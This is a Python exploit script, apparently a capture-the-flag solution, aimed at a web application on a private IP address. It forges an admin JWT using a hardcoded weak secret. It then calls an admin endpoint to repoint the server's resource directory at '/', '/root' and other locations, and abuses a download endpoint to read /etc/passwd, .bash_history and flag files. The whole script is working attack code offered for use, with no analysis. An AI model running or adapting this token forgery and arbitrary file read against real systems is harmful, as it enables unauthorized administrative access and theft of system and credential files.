#!/usr/bin/env python3
"""
通过修改resourceDir然后使用download来列出目录内容
"""

import jwt
import requests
import json

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

def set_resource_dir(path):
    """设置资源目录"""
    r = requests.post(
        f"{TARGET}/admin/challengeResourceDir",
        headers=headers,
        json={"resourceDir": path},
        timeout=5
    )
    return r.status_code == 200

def download_file(filename):
    """下载文件"""
    r = requests.get(
        f"{TARGET}/dashboard/download?path={filename}",
        headers=headers,
        timeout=5
    )
    if r.status_code == 200:
        return r.text
    return None

# 搜索根目录下的所有文件和目录
print("[*] 尝试列出根目录内容\n")

# 首先设置到根目录
set_resource_dir("/")

# 尝试读取常见的文件
common_files_root = [
    "flag",
    "flag.txt",
    "FLAG",
    "FLAG.txt",
    "etc/passwd",
    "proc/version",
]

for file in common_files_root:
    content = download_file(file)
    if content and "error" not in content.lower():
        print(f"[+] /{file}:")
        print(f"    {content[:200]}\n")

# 搜索其他常见位置
search_locations = [
    ("/root", ["flag", "flag.txt", ".bash_history"]),
    ("/tmp", ["flag", "flag.txt"]),
    ("/app", ["flag", "flag.txt"]),
    ("/home", ["flag", "flag.txt"]),
    ("/var", ["flag", "flag.txt"]),
]

for dir_path, files in search_locations:
    print(f"\n[*] 搜索 {dir_path}")
    set_resource_dir(dir_path)
    
    for file in files:
        content = download_file(file)
        if content and "error" not in content.lower() and len(content) > 0:
            print(f"  [+] {file}: {content[:100]}")
            if "flag{" in content.lower() or "pcb{" in content.lower():
                print(f"\n[!] FLAG 找到!")
                print(f"[!] 完整内容:\n{content}")
                exit(0)

# 通过stats端点获取文件信息
print("\n[*] 尝试通过stats端点获取信息")
try:
    r = requests.get(f"{TARGET}/dashboard/stats", headers=headers, timeout=5)
    print(f"  状态: {r.status_code}")
    if r.status_code == 200:
        print(f"  响应: {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# 尝试recent端点
print("\n[*] 尝试通过recent端点获取信息")
try:
    r = requests.get(f"{TARGET}/dashboard/recent", headers=headers, timeout=5)
    print(f"  状态: {r.status_code}")
    if r.status_code == 200:
        print(f"  响应: {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n[+] 如果flag不在常见位置，可能需要：")
print("  1. 查看应用源码了解flag存储位置")
print("  2. 检查环境变量")
print("  3. 利用命令执行遍历整个文件系统")
